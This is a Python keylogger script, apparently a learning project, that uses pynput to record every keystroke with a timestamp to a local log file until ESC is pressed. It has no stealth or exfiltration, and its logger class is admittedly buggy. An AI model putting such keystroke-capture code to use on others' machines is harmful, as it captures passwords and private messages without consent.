import time
from pynput import keyboard
import logging

class logger:
    #singleton instantiation
    #Global Access for Logger
    _instance = None

    def __new__(cls):
        if not cls._instance:
            cls._instance = super(logger, cls).__new__(cls)
            cls._instance.keylogger_instance = Keylogger()
        return cls._instance
    
    #To add new user instances and check wheather the data goes under same directory
    #code still has vulnerabilities
    #Last edited 23-02-2024 9:00 PM

    log_file = "keylogger.log"
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s  %(message)s')
    #logging_instance = logging.getLogger("Keylogger_Logger")



class Keylogger(logger):
    def __init__(self):
        self.log = []

    def on_press(self, key):
        try:
            # Record the timestamp and the key that was pressed
            timestamp = time.time()
            key_str = key.char if hasattr(key, 'char') else str(key)

            self.log.append((timestamp, key_str))

            # Record the key pressed
            logging.info(f"Key pressed: {key_str}")

        except Exception as e:
            print(f"Error: {e}")
            # Handle special keys
            key_str = str(key).replace("'", "") # Clear Representation of Special Keys
            logging.info(f"key pressed: {key_str}")


    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener and print the collected keystrokes
            return False

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def print_log(self):
        for timestamp, key in self.log:
            print(f"{timestamp}: {key}")

if __name__ == "__main__":
    #logger_instance = logger() # Class not called (Acquiring Attribute error at start_logging method)
    keylogger = Keylogger()
    print("Press ESC to stop logging.")
    print("Keylogger Intiated...")
    keylogger.start_logging()
    keylogger.print_log()
